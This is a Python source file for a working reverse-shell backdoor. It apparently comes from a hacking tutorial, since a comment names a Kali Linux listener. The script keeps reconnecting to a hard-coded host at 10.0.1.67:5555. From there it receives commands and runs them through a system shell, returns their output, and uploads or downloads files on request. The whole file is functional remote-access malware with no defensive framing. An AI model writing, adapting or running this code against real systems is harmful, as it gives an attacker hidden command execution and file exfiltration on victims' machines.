import socket
import time
import json
import subprocess
import os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def reliable_send(data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())

def reliable_receive():
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(('10.0.1.67', 5555))  # will try to connect to kali linux machine
            shell()  # shell function needs to be coded to execute commands
            sock.close()  # close socket object
            break
        except:
            connection()

def upload_file(file_name):
    f = open(file_name, 'rb')
    sock.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    sock.settimeout(1)
    chunk = sock.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break

    sock.settimeout(None)
    f.close()

def shell():
    while True:
        command = reliable_receive()
        if command == 'quit':
            break  # this will exit out the program once you use quit.
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
            reliable_send(f"Changed directory to {command[3:]}")
        elif command[:9] == 'download:':
            upload_file(command[9:])
        elif command[:7] == 'upload ':
            download_file(command[7:])
            reliable_send(f"Downloaded file {command[7:]}")
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

connection()
